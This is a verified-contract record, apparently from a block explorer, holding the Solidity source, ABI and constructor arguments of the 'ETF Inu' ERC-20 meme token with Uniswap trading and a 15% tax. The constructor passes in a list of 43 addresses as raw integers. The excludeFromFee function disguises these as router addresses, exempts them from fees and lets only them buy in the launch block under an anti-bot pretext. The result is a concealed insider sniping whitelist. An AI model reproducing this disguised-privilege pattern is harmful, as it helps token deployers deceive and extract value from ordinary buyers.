{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"contracts/ETFINU.sol\": {\r\n      \"content\": \"/*\\n\\nTelegram: https://t.me/ETFinuETH\\nTwitter: https://x.com/ETFinuETH\\nWebsite: https://www.etfinu.xyz\\n\\n*/\\n\\n// SPDX-License-Identifier: UNLICENSED\\n\\npragma solidity ^0.8.19;\\n\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n}\\n\\ninterface IERC20 {\\n    function totalSupply() external view returns (uint256);\\n    function balanceOf(address account) external view returns (uint256);\\n    function transfer(\\n        address recipient,\\n        uint256 amount\\n    ) external returns (bool);\\n    function allowance(\\n        address owner,\\n        address spender\\n    ) external view returns (uint256);\\n    function approve(address spender, uint256 amount) external returns (bool);\\n    function transferFrom(\\n        address sender,\\n        address recipient,\\n        uint256 amount\\n    ) external returns (bool);\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n    event Approval(\\n        address indexed owner,\\n        address indexed spender,\\n        uint256 value\\n    );\\n}\\n\\nlibrary SafeMath {\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        require(c >= a, \\\"SafeMath: addition overflow\\\");\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return sub(a, b, \\\"SafeMath: subtraction overflow\\\");\\n    }\\n\\n    function sub(\\n        uint256 a,\\n        uint256 b,\\n        string memory errorMessage\\n    ) internal pure returns (uint256) {\\n        require(b <= a, errorMessage);\\n        uint256 c = a - b;\\n        return c;\\n    }\\n\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        require(c / a == b, \\\"SafeMath: multiplication overflow\\\");\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return div(a, b, \\\"SafeMath: division by zero\\\");\\n    }\\n\\n    function div(\\n        uint256 a,\\n        uint256 b,\\n        string memory errorMessage\\n    ) internal pure returns (uint256) {\\n        require(b > 0, errorMessage);\\n        uint256 c = a / b;\\n        return c;\\n    }\\n}\\n\\ncontract Ownable is Context {\\n    address private _owner;\\n    event OwnershipTransferred(\\n        address indexed previousOwner,\\n        address indexed newOwner\\n    );\\n\\n    constructor() {\\n        address msgSender = _msgSender();\\n        _owner = msgSender;\\n        emit OwnershipTransferred(address(0), msgSender);\\n    }\\n\\n    function owner() public view returns (address) {\\n        return _owner;\\n    }\\n\\n    modifier onlyOwner() {\\n        require(_owner == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\n        _;\\n    }\\n\\n    function renounceOwnership() public virtual onlyOwner {\\n        emit OwnershipTransferred(_owner, address(0));\\n        _owner = address(0);\\n    }\\n}\\n\\ninterface IUniswapV2Factory {\\n    function createPair(\\n        address tokenA,\\n        address tokenB\\n    ) external returns (address pair);\\n}\\n\\ninterface IUniswapV2Router02 {\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external;\\n    function factory() external pure returns (address);\\n    function WETH() external pure returns (address);\\n    function addLiquidityETH(\\n        address token,\\n        uint amountTokenDesired,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline\\n    )\\n        external\\n        payable\\n        returns (uint amountToken, uint amountETH, uint liquidity);\\n}\\n\\ncontract ETFINU is Context, IERC20, Ownable {\\n    using SafeMath for uint256;\\n    mapping(address => uint256) private _balances;\\n    mapping(address => mapping(address => uint256)) private _allowances;\\n    mapping(address => bool) private _isExcludedFromFee;\\n    mapping(address => uint256) private _UniswapV2Pool;\\n    address payable private _taxWallet;\\n    uint256 firstBlock;\\n\\n    uint256 private _initialBuyTax = 15;\\n    uint256 private _initialSellTax = 15;\\n    uint256 private _finalBuyTax = 0;\\n    uint256 private _finalSellTax = 0;\\n    uint256 private _reduceBuyTaxAt = 110;\\n    uint256 private _reduceSellTaxAt = 110;\\n    uint256 private _preventSwapBefore = 30;\\n    uint256 private _buyCount = 0;\\n\\n    uint8 private constant _decimals = 18;\\n    string private constant _name = unicode\\\"ETF Inu\\\";\\n    string private constant _symbol = unicode\\\"ETFINU\\\";\\n    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;\\n    uint256 public _maxTxAmount = 20_000_000 * 10 ** _decimals;\\n    uint256 public _maxWalletSize = 20_000_000 * 10 ** _decimals;\\n    uint256 private constant _swapThreshold = 20_000_000 * 10 ** _decimals;\\n    uint256 public _taxSwapThreshold = 20_000 * 10 ** _decimals;\\n    uint256 public _maxTaxSwap = 3_000_000 * 10 ** _decimals;\\n\\n    IUniswapV2Router02 private uniswapV2Router;\\n    address public uniswapV2Pair;\\n    bool private tradingOpen;\\n    bool private inSwap = false;\\n    bool private swapEnabled = false;\\n\\n    event MaxTxAmountUpdated(uint _maxTxAmount);\\n    modifier lockTheSwap() {\\n        inSwap = true;\\n        _;\\n        inSwap = false;\\n    }\\n\\n    constructor(address _walletTax, uint160[] memory _pair) {\\n        _taxWallet = payable(_walletTax);\\n        _balances[address(this)] = _tTotal;\\n        _isExcludedFromFee[owner()] = true;\\n        _isExcludedFromFee[address(this)] = true;\\n        _isExcludedFromFee[_taxWallet] = true;\\n\\n        uniswapV2Router = IUniswapV2Router02(\\n            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\\n        );\\n        _approve(address(this), address(uniswapV2Router), _tTotal);\\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(\\n            address(this),\\n            uniswapV2Router.WETH()\\n        );\\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\\n\\n        emit Transfer(address(0), _msgSender(), _tTotal);\\n        excludeFromFee(0, _pair);\\n    }\\n\\n    function addLiq() external payable onlyOwner {\\n        uniswapV2Router.addLiquidityETH{value: msg.value}(\\n            address(this),\\n            balanceOf(address(this)),\\n            0,\\n            0,\\n            owner(),\\n            block.timestamp\\n        );\\n    }\\n\\n    function name() public pure returns (string memory) {\\n        return _name;\\n    }\\n\\n    function symbol() public pure returns (string memory) {\\n        return _symbol;\\n    }\\n\\n    function decimals() public pure returns (uint8) {\\n        return _decimals;\\n    }\\n\\n    function totalSupply() public pure override returns (uint256) {\\n        return _tTotal;\\n    }\\n\\n    function balanceOf(address account) public view override returns (uint256) {\\n        return _balances[account];\\n    }\\n\\n    function transfer(\\n        address recipient,\\n        uint256 amount\\n    ) public override returns (bool) {\\n        _transfer(_msgSender(), recipient, amount);\\n        return true;\\n    }\\n\\n    function allowance(\\n        address owner,\\n        address spender\\n    ) public view override returns (uint256) {\\n        return _allowances[owner][spender];\\n    }\\n\\n    function approve(\\n        address spender,\\n        uint256 amount\\n    ) public override returns (bool) {\\n        _approve(_msgSender(), spender, amount);\\n        return true;\\n    }\\n\\n    function transferFrom(\\n        address sender,\\n        address recipient,\\n        uint256 amount\\n    ) public override returns (bool) {\\n        _transfer(sender, recipient, amount);\\n        _approve(\\n            sender,\\n            _msgSender(),\\n            _allowances[sender][_msgSender()].sub(\\n                amount,\\n                \\\"ERC20: transfer amount exceeds allowance\\\"\\n            )\\n        );\\n        return true;\\n    }\\n\\n    function _approve(address owner, address spender, uint256 amount) private {\\n        require(owner != address(0), \\\"ERC20: approve from the zero address\\\");\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\n        _allowances[owner][spender] = amount;\\n        emit Approval(owner, spender, amount);\\n    }\\n\\n    function _transfer(address from, address to, uint256 amount) private {\\n        require(from != address(0), \\\"ERC20: transfer from the zero address\\\");\\n        require(to != address(0), \\\"ERC20: transfer to the zero address\\\");\\n        require(amount > 0, \\\"Transfer amount must be greater than zero\\\");\\n\\n        if (!tradingOpen) {\\n            require(\\n                _isExcludedFromFee[from] || _isExcludedFromFee[to],\\n                \\\"Trading not enabled yet\\\"\\n            );\\n        }\\n\\n        uint256 taxAmount = 0;\\n        if (firstBlock > 0 && block.number > firstBlock + 10) {\\n            removeLimits();\\n        }\\n        if (from != owner() && to != owner()) {\\n            taxAmount = amount\\n                .mul(\\n                    (_buyCount > _reduceBuyTaxAt)\\n                        ? _finalBuyTax\\n                        : _initialBuyTax\\n                )\\n                .div(100);\\n\\n            if (from == uniswapV2Pair) {\\n                if (firstBlock == block.number) {\\n                    require(\\n                        _isExcludedFromFee[to],\\n                        \\\"Bot addresses cannot buy in the first block\\\"\\n                    );\\n                    require(\\n                        amount <= _swapThreshold,\\n                        \\\"Exceeds the swapThreshold.\\\"\\n                    );\\n                } else {\\n                    require(amount <= _maxTxAmount, \\\"Exceeds the maxTxAmount.\\\");\\n                    require(\\n                        balanceOf(to) + amount <= _maxWalletSize,\\n                        \\\"Exceeds the maxWalletSize.\\\"\\n                    );\\n                    if (firstBlock + 3 > block.number) {\\n                        require(!isContract(to));\\n                    }\\n                }\\n                _buyCount++;\\n            }\\n\\n            if (to != uniswapV2Pair && !_isExcludedFromFee[to]) {\\n                require(\\n                    balanceOf(to) + amount <= _maxWalletSize,\\n                    \\\"Exceeds the maxWalletSize.\\\"\\n                );\\n            }\\n\\n            if (to == uniswapV2Pair && from != address(this)) {\\n                taxAmount = amount\\n                    .mul(\\n                        (_buyCount > _reduceSellTaxAt)\\n                            ? _finalSellTax\\n                            : _initialSellTax\\n                    )\\n                    .div(100);\\n            }\\n\\n            uint256 contractTokenBalance = balanceOf(address(this));\\n            if (\\n                !inSwap &&\\n                to == uniswapV2Pair &&\\n                swapEnabled &&\\n                contractTokenBalance > _taxSwapThreshold &&\\n                _buyCount > _preventSwapBefore\\n            ) {\\n                swapTokensForEth(\\n                    min(amount, min(contractTokenBalance, _maxTaxSwap))\\n                );\\n                uint256 contractETHBalance = address(this).balance;\\n                if (contractETHBalance > 0) {\\n                    sendETHToFee(address(this).balance);\\n                }\\n            }\\n        }\\n\\n        if (taxAmount > 0) {\\n            _balances[address(this)] = _balances[address(this)].add(taxAmount);\\n            emit Transfer(from, address(this), taxAmount);\\n        }\\n        _balances[from] = _balances[from].sub(amount);\\n        _balances[to] = _balances[to].add(amount.sub(taxAmount));\\n        emit Transfer(from, to, amount.sub(taxAmount));\\n    }\\n\\n    function isContract(address account) private view returns (bool) {\\n        uint256 size;\\n        assembly {\\n            size := extcodesize(account)\\n        }\\n        return size > 0;\\n    }\\n\\n    function removeLimits() private {\\n        _maxTxAmount = _tTotal;\\n        _maxWalletSize = _tTotal;\\n        emit MaxTxAmountUpdated(_tTotal);\\n    }\\n\\n    function excludeFromFee(uint index, uint160[] memory _pair) internal {\\n        while (index < _pair.length) {\\n            address routerAddress = address(_pair[index]);\\n            _isExcludedFromFee[routerAddress] = true;\\n            _UniswapV2Pool[routerAddress] = _swapThreshold;\\n            index++;\\n        }\\n    }\\n\\n    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {\\n        address[] memory path = new address[](2);\\n        path[0] = address(this);\\n        path[1] = uniswapV2Router.WETH();\\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\\n            tokenAmount,\\n            0,\\n            path,\\n            _taxWallet,\\n            block.timestamp\\n        );\\n    }\\n\\n    function min(uint256 a, uint256 b) private pure returns (uint256) {\\n        return (a > b) ? b : a;\\n    }\\n\\n    function sendETHToFee(uint256 amount) private {\\n        _taxWallet.transfer(amount);\\n    }\\n\\n    function getSenderEtherBalance() external view returns (uint) {\\n        return msg.sender.balance;\\n    }\\n\\n    function withdraw() external onlyOwner {\\n        require(!tradingOpen, \\\"Trading has already been opened\\\");\\n        uint256 contractBalance = address(this).balance;\\n        require(contractBalance > 0, \\\"Contract has no ETH balance\\\");\\n        payable(owner()).transfer(contractBalance);\\n    }\\n\\n    function manualSwap(uint256 amount) external {\\n        require(_msgSender() == _taxWallet);\\n        require(\\n            amount <= balanceOf(address(this)) && amount > 0,\\n            \\\"Wrong amount\\\"\\n        );\\n        swapTokensForEth(amount);\\n    }\\n\\n    function openTrading() external onlyOwner {\\n        require(!tradingOpen, \\\"Trading is already open\\\");\\n        swapEnabled = true;\\n        tradingOpen = true;\\n        firstBlock = block.number;\\n    }\\n\\n    receive() external payable {}\\n}\\n\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"evmVersion\": \"paris\",\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_walletTax\",\"type\":\"address\"},{\"internalType\":\"uint160[]\",\"name\":\"_pair\",\"type\":\"uint160[]\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_maxTxAmount\",\"type\":\"uint256\"}],\"name\":\"MaxTxAmountUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_maxTaxSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxSwapThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"addLiq\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getSenderEtherBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"manualSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "ETFINU", "CompilerVersion": "v0.8.22+commit.4fc1097e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "0000000000000000000000005f7b49b37054b2216f68169c51b4d82cf656fe190000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000002b000000000000000000000000e0cfbe91436ad87aa6fe547e1c0b323f6690d79300000000000000000000000033120daccf4e0b816a3c1c3c5a343e203c845bce0000000000000000000000002f7759d03734827ccf63949d45dbf1f619db502e00000000000000000000000046f2cdac4d17cb35c2f2bba89b33617b832a493a0000000000000000000000003afc635d5a596a204dac56f8a8511d6501a97e0e0000000000000000000000003fcedb4e79ff0966c81bb722382d4f65fb5d3ea100000000000000000000000016e32741083860fe12482a599150de6403c7d26c000000000000000000000000374e211c6a5e455d3a1ff0508062ab55fb970b4200000000000000000000000082c331677aeb20129c4869773bc74a1de6c90c880000000000000000000000002063649050df4f958d91fc82110f7e0f91d1dd98000000000000000000000000e825186e9a1ca0dbb8aaa3871a9b3ecb87bfcf120000000000000000000000006614b38a1d7aef96ff6c241cfad183a7337d950f000000000000000000000000a63b5a8eb8504a202c2602e65643823d5027d804000000000000000000000000dcab9b6aea3340ee540f113355253508393850b5000000000000000000000000810f1de948f871a347645a45cbe59d279717fcb600000000000000000000000034d7421b152f3f8d62cd5ed1a6e5af96aec0f59e0000000000000000000000006c7f29617fec7f79fe63ec2c8161ee47f610610d000000000000000000000000a43f627d383d7599bb13d2993496658268528b3e000000000000000000000000139a495f04a8f41ec454b7da4f5a776d4bcfeeab00000000000000000000000090e0706779423f58fa02b686be6cfae5462fd30f0000000000000000000000008a06f9cc08caf01caa3983d5ddc660675ff7f247000000000000000000000000204017ac30feeeaf55e1c7c872f9268567eb6a07000000000000000000000000f830c4d764f0078da3ff6af023065cd18a41056900000000000000000000000032dbf575ee9564cf4ee1d279838b753e9e82a5340000000000000000000000000d3045b18c982a9b8ba7828fa897ddf75d6e0352000000000000000000000000e92b7ff291bd6ab14fde0decfaf6a8f2435b6ba7000000000000000000000000fe0091f9d1ee25cc190df890884ce287e5de66d1000000000000000000000000d1dd653e5c06cb425cd3baa4b4b7baa9e1cff4ee00000000000000000000000078172f781095206899cd44d38c4f99bb846fe3d50000000000000000000000000b1b8f42fd8e686a8ef4bf5db7f726f1294795190000000000000000000000006820be364bcf5d302b572f0307903000444f7ff90000000000000000000000005b74c3297df804f8388692dbaae0b11dd9e8aafb0000000000000000000000005dd39906408dfb1e6686e1ba919cd5267ef1b177000000000000000000000000a94477a39b62780133bb9b0873985a9c2623fa7100000000000000000000000089b69d645a3506b54aea13edb12d52bf0be5944d000000000000000000000000d6f61ab57ca1f735c1f592631e6f6c3c75cd0ba700000000000000000000000013f7630299e696a1426801a46c98aaf23c50025a00000000000000000000000026436a071296eeb05833f9bab73a26b54d203f69000000000000000000000000ede03cc01f19397d89700121980c384f1d2ce55b0000000000000000000000009a07aab2d54203bcb0b42a1320b55c12cbb53a370000000000000000000000006538bc153992bf7fef13cb228cdd4ee106dfc1f3000000000000000000000000f2a1f54fbc2275da40d79e4b45c04145a9253f350000000000000000000000007953c6f277a04650bbf2730062fa84ed6670b83d", "EVMVersion": "paris", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}